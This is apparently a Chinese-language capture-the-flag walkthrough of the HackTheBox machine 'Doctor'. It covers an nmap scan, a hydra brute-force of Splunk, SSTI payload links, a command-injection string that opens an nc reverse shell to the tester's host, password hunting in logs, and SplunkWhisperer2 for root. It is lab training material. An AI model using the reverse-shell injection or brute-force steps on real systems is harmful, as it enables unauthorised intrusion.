kali 10.10.14.5

靶机 10.10.10.209



```bash
└─# nmap  -sV -sC -O  $IP -oA nmap.txt -p `nmap -sS -sU -PN -p- $IP --min-rate=8888 | grep '/tcp\|/udp' | awk -F '/' '{print $1}' | sort -u | tr '\n' ','`
```

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 594d4ec2d8cfda9da8c8d0fd99a84617 (RSA)
|   256 7ff3dcfb2dafcbff9934ace0f8001e47 (ECDSA)
|_  256 530e966b9ce9c1a170516c2dce7b43e8 (ED25519)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Doctor
8089/tcp open  ssl/http Splunkd httpd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2020-09-06T15:57:27
|_Not valid after:  2023-09-06T15:57:27
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|specialized
Running (JUST GUESSING): Linux 5.X|4.X|2.6.X (98%), Crestron 2-Series (90%)
OS CPE: cpe:/o:linux:linux_kernel:5.0 cpe:/o:linux:linux_kernel:4 cpe:/o:crestron:2_series cpe:/o:linux:linux_kernel:2.6.32
Aggressive OS guesses: Linux 5.0 (98%), Linux 4.15 - 5.6 (90%), Linux 5.0 - 5.3 (90%), Crestron XPanel control system (90%), Linux 5.0 - 5.4 (90%), Linux 2.6.32 (90%), Linux 5.4 (89%), Linux 5.3 - 5.4 (88%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

一看端口，大概率 web 打点



<img src=".\图片\Snipaste_2023-09-23_12-28-13.png" alt="Snipaste_2023-09-23_12-28-13" style="zoom:80%;" />



<img src=".\图片\Snipaste_2023-09-23_12-28-28.png" alt="Snipaste_2023-09-23_12-28-28" style="zoom:80%;" />



```bash
echo '10.10.10.209 doctors.htb' >> /etc/hosts
```



<img src=".\图片\Snipaste_2023-09-23_12-34-23.png" alt="Snipaste_2023-09-23_12-34-23" style="zoom:67%;" />





找到了 splunkd cms 的 已知账号密码的利用

```
https://github.com/cnotin/SplunkWhisperer2/
https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/
```



```bash
└─# cewl http://10.10.10.209 -w cewl.list
```



```bash
└─# hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 10.10.10.209 -s 8089 https-get /services
```



创建账号登录

<img src=".\图片\Snipaste_2023-09-23_13-38-53.png" alt="Snipaste_2023-09-23_13-38-53" style="zoom:80%;" />

发现是 python 服务器



存在 ssti 模板注入，可直接找 payload 

```http
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#exploit-the-ssti-by-calling-popen-without-guessing-the-offset
```

```http
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python
```



也可以尝试命令注入

<img src=".\图片\image-20201101100239532.webp" alt="image-20201101100239532" style="zoom:80%;" />

```bash
http://10.10.14.6/$(nc.traditional$IFS-e$IFS'/bin/bash'$IFS'10.10.14.6'$IFS'443')
```



再到 web 日志里找到一个修改的密码

```bash
grep -r passw . 2>/dev/null 
```



再利用之前的 cms 提权到 root ，凭据 是 日志里发现的密码

```
git clone https://github.com/cnotin/SplunkWhisperer2.git
```




